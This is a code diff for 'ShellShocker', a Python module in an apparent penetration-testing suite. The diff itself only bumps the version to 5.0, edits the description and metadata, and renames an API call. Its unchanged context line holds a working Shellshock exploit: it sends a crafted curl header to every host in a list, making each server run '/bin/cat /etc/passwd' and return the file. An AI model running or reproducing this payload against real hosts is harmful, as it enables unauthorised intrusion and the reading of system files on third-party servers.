@@ -30,9 +30,9 @@ except ImportError:
 # Put your module information here.
 info = {
         "name": "ShellShocker", # Module filename (Change this; I recommend you to use the filename as the module name.)
-        "version": "4.0", # version
+        "version": "5.0", # version
         "author": "NullArray", # Author
-        "desc": "A bash script that tests [a list of] hosts for the shellshock vulnerability.", # Brief description
+        "desc": "A script that tests [a list of] hosts for the shellshock vulnerability.", # Brief description
         "email": "none", # Email
         "authorinfo": "Ported to Python 3 by Catayao56.", # Additional information about the author; this could be
         "lastupdate": "Apr. 11, 2018",                     # a website of the author.
@@ -42,9 +42,11 @@ info = {
                                           # 0 == True; any number means false.
 }
 dependencies = ['BINARY: curl', 'BINARY: xargs', 'BINARY: cat'] # Put needed dependencies here.  
+module_status = 0
+category = ['shell', 'shock', 'nullarray', 'bash', 'python', 'catayao56']
 
 # Changelog of the module
-changelog = "Version 4.0:\nMandatory module update\n\nVersion 3.0:\nMandatory bug fix\n\nVersion 2.0:\nPorted to Python by Catayao56\n\nVersion 1.0:\nInitial module release"
+changelog = "Version 5.0:\nMandatory module update\n\nVersion 4.0:\nMandatory module update\n\nVersion 3.0:\nMandatory bug fix\n\nVersion 2.0:\nPorted to Python by Catayao56\n\nVersion 1.0:\nInitial module release"
 # Changelog format:
 #
 # changelog = "Version 2.0:\nUpdate Description\n\nVersion1.0\nInitial module release"
@@ -122,4 +124,4 @@ def module_body():
     output = 'output/' + output_name
     os.system("cat " + path_to_hosts + " | xargs -I % bash -c \'curl % -H \"custom:() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd\" && echo ----END OF RESPONSE----\' | tee " + output)
     os.system("rm " + path_to_hosts)
-    print(API.ShadowSuiteLE().FINISH)
+    print(API.ShadowSuite().FINISH)
